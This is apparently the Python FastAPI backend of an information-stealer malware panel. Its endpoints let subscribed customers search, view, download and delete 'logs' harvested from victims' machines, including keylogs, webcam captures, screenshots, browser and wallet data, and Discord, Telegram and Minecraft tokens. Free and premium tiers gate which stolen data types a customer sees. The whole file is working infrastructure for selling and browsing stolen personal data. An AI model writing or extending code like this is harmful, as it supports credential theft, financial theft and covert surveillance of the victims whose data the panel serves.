from typing import Any, List, Optional
from fastapi import APIRouter, Depends, HTTPException, Query, Response
from fastapi.responses import StreamingResponse
from sqlalchemy.orm import Session
from sqlalchemy import or_
from app.api import deps
from app.core.database import get_db
from app.models.user import User, Log, PlanType
import json
import base64
import io
import os

router = APIRouter()

# Premium-only log types - Free users can't see these (but Admin always can)
PREMIUM_LOG_TYPES = ['discord', 'minecraft', 'minecraft_refresh', 'webcam', 'keylog', 'audio', 'wallet', 'browser', 'gaming', 'telegram', 'files']

# Hidden log types that should NOT appear in the general logs/listings (only accessible via dedicated tabs/endpoints)
HIDDEN_LOG_TYPES = ['screenshot', 'webcam']

# NOTE: 'webcam' is both premium and hidden. 'screenshot' is hidden only; searches or explicit type filters MAY still access it.

# Upload directory for ZIP files
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), '..', '..', '..', '..', 'uploads')

def serialize_log(log):
    """Serialize a log entry with parsed data"""
    # Parse content as JSON if possible
    try:
        data = json.loads(log.content) if log.content else {}
    except:
        data = {"raw": log.content}
    
    # Extract country from data if available
    country = data.get('country', '') or data.get('location', {}).get('country', '') or 'Unknown'
    
    # Extract pc_name and pc_user - first from log columns, then from data
    pc_name = log.pc_name or data.get('pc_name', '') or data.get('pcName', '') or 'Unknown'
    pc_user = log.pc_user or data.get('pc_user', '') or data.get('pcUser', '') or data.get('player', '') or 'Unknown'
    
    return {
        "id": log.id,
        "user_id": log.user_id,
        "log_type": log.log_type,
        "content": log.content,
        "data": data,  # Parsed JSON for frontend
        "ip_address": log.ip_address or 'Unknown',
        "ip": log.ip_address or 'Unknown',  # Alias for frontend compatibility
        "country": country,     # Extract from data for frontend
        "pc_name": pc_name,
        "pc_user": pc_user,
        "created_at": log.created_at.isoformat() if log.created_at else None
    }

@router.get("/search")
def search_logs(
    q: str = "",
    type: Optional[str] = None,
    db: Session = Depends(get_db),
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Search logs by content"""
    query = db.query(Log)
    
    # By default: hide screenshot/webcam entries from general searches unless explicitly requested
    if not type or type == 'all':
        query = query.filter(~Log.log_type.in_(HIDDEN_LOG_TYPES))

    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
        if current_user.plan == PlanType.FREE:
            query = query.filter(~Log.log_type.in_(PREMIUM_LOG_TYPES))
    
    if type and type != 'all':
        query = query.filter(Log.log_type == type)
    
    if q:
        search_term = f'%{q}%'
        query = query.filter(
            or_(
                Log.content.ilike(search_term),
                Log.ip_address.ilike(search_term),
                Log.pc_name.ilike(search_term),
                Log.pc_user.ilike(search_term)
            )
        )
    
    logs = query.order_by(Log.created_at.desc()).limit(100).all()
    return {"success": True, "logs": [serialize_log(log) for log in logs]}

@router.get("/")
def read_logs(
    db: Session = Depends(get_db),
    skip: int = 0,
    limit: int = 100000, # Increased limit significantly, effectively unlimited for now
    type: Optional[str] = None,
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    query = db.query(Log)
    
    # By default, hide screenshot/webcam from general listings unless explicitly asked
    if not type or type == 'all':
        query = query.filter(~Log.log_type.in_(HIDDEN_LOG_TYPES))

    # User isolation - non-admin only sees their own logs
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
        
        # Plan-based filtering - Free users can't see premium log types
        if current_user.plan == PlanType.FREE:
            query = query.filter(~Log.log_type.in_(PREMIUM_LOG_TYPES))
    
    if type and type != 'all':
        query = query.filter(Log.log_type == type)
        
    logs = query.order_by(Log.created_at.desc()).offset(skip).limit(limit).all()
    return {"success": True, "logs": [serialize_log(log) for log in logs]}


@router.get("/{log_id}")
def get_log(
    log_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Get a single log entry"""
    log = db.query(Log).filter(Log.id == log_id).first()
    if not log:
        raise HTTPException(status_code=404, detail="Log not found")
    
    # Check ownership
    if not current_user.is_admin and log.user_id != current_user.id:
        raise HTTPException(status_code=403, detail="Not authorized")
    
    # Plan check
    if not current_user.is_admin and current_user.plan == PlanType.FREE:
        if log.log_type in PREMIUM_LOG_TYPES:
            raise HTTPException(status_code=403, detail="Premium feature")
    
    return {
        "success": True,
        "log": serialize_log(log)
    }


@router.get("/{log_id}/download")
def download_log(
    log_id: int,
    token: str = None,
    db: Session = Depends(get_db),
) -> Any:
    """Download log content as file"""
    # For download, we verify token manually since it's passed as query param
    from jose import jwt, JWTError
    from app.core.config import settings
    from app.schemas.schemas import TokenPayload
    
    if not token:
        raise HTTPException(status_code=401, detail="Token required")
    
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.ALGORITHM])
        token_data = TokenPayload(**payload)
    except (JWTError, ValueError):
        raise HTTPException(status_code=403, detail="Invalid token")
    
    current_user = db.query(User).filter(User.id == token_data.sub).first()
    if not current_user:
        raise HTTPException(status_code=404, detail="User not found")
    
    log = db.query(Log).filter(Log.id == log_id).first()
    if not log:
        print(f"DEBUG: Download ZIP - Log {log_id} not found")
        raise HTTPException(status_code=404, detail="Log not found")
    
    print(f"DEBUG: Download request for log {log_id}. Type: {log.log_type}")
    
    # Check ownership
    if not current_user.is_admin and log.user_id != current_user.id:
        raise HTTPException(status_code=403, detail="Not authorized")
    
    # Handle different log types
    if log.log_type == 'zip_upload':
        # Return the actual ZIP file
        try:
            content = json.loads(log.content)
            filename = content.get('filename', f'log_{log_id}.zip')
            filepath = os.path.join(UPLOAD_DIR, str(log.user_id), filename)
            
            if os.path.exists(filepath):
                def iterfile():
                    with open(filepath, 'rb') as f:
                        yield from f
                
                return StreamingResponse(
                    iterfile(),
                    media_type='application/zip',
                    headers={'Content-Disposition': f'attachment; filename="{filename}"'}
                )
            else:
                raise HTTPException(status_code=404, detail="ZIP file not found on disk")
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
    
    elif log.log_type in ['screenshot', 'webcam']:
        # Return image from base64
        try:
            content = json.loads(log.content)
            image_b64 = content.get('image', '')
            if not image_b64:
                raise HTTPException(status_code=404, detail="No image data")
            
            # Remove data URL prefix if present
            if ',' in image_b64:
                image_b64 = image_b64.split(',')[1]
            
            image_data = base64.b64decode(image_b64)
            return Response(
                content=image_data,
                media_type='image/png',
                headers={'Content-Disposition': f'attachment; filename="{log.log_type}_{log_id}.png"'}
            )
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
    
    else:
        # Return JSON content as file
        return Response(
            content=log.content,
            media_type='application/json',
            headers={'Content-Disposition': f'attachment; filename="log_{log_id}.json"'}
        )


@router.delete("/{log_id}")
def delete_log(
    log_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Delete a log entry"""
    log = db.query(Log).filter(Log.id == log_id).first()
    if not log:
        raise HTTPException(status_code=404, detail="Log not found")
    
    # Check ownership - admin can delete any, users only their own
    if not current_user.is_admin and log.user_id != current_user.id:
        raise HTTPException(status_code=403, detail="Not authorized")
    
    db.delete(log)
    db.commit()
    
    return {"success": True, "message": f"Log {log_id} deleted"}


@router.delete("/")
def delete_all_logs(
    db: Session = Depends(get_db),
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Delete all logs for current user (admin can delete all)"""
    if current_user.is_admin:
        count = db.query(Log).delete()
    else:
        count = db.query(Log).filter(Log.user_id == current_user.id).delete()
    
    db.commit()
    return {"success": True, "deleted": count}


@router.post('/cleanup_images')
def cleanup_image_logs(
    days: int = 0,
    db: Session = Depends(get_db),
    current_user: User = Depends(deps.get_current_user),
) -> Any:
    """Admin-only: delete screenshot and webcam logs older than X days (0 = all)"""
    if not current_user.is_admin:
        raise HTTPException(status_code=403, detail="Admin only")

    query = db.query(Log).filter(Log.log_type.in_(HIDDEN_LOG_TYPES))
    if days > 0:
        from datetime import datetime, timedelta
        cutoff = datetime.now() - timedelta(days=days)
        query = query.filter(Log.created_at < cutoff)

    deleted = query.delete(synchronize_session=False)
    db.commit()
    return {"success": True, "deleted": deleted}
